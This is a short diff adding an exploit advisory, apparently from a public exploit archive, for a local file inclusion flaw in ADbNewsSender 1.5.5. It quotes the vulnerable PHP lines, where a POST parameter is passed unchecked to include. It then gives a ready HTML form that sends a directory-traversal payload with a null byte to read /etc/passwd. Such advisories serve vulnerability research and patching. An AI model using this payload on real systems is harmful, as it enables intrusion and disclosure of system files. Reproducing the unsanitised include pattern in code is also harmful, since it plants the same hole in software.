@@ -1,0 +1,29 @@
+##########################################
+##   Exploit found by KillaWho | wh0    ##
+##        MSN: admin@x-pl0it.net        ##
+##########################################
+
+# Title: ADbNewsSender 1.5.5 LFI
+# Src: http://adbnewssender.sourceforge.net
+
+
+
+## VULN ##
+
+File: maillinglist/setup/step1.php.inc
+
+Line: 33
+$path_to_lang=$_POST[&#039;path_to_lang&#039;];
+
+35:
+include &quot;../config/$path_to_lang/lang-setup.php.inc&quot;;
+
+
+## Exploit (exploit.html) ##
+&lt;html&gt;
+&lt;form action=&quot;http://www.example.com/ADbNewsSender%201.5.5/setup/index.php&quot; method=post&gt;
+&lt;input type=&quot;text&quot; name=&quot;path_to_lang&quot; value=&quot;../../../../../etc/passwd%00&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;step&quot; value=&quot;2&quot;&gt;
+&lt;input type=submit value=&quot;Exploit!&quot;&gt;
+&lt;/form&gt;
+&lt;/html&gt;
